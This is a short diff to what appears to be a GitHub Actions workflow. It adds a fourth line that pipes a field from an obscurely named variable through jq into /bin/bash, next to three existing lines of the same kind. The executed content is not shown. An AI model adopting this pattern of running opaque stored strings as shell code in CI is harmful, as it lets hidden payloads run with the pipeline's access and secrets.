@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$csm1315" | jq -r .s3884 | /bin/bash
           printf '%s' "$t686" | jq -r .mlio4344 | /bin/bash
           printf '%s' "$p66" | jq -r .dh6 | /bin/bash
+          printf '%s' "$cg41605" | jq -r .s839 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
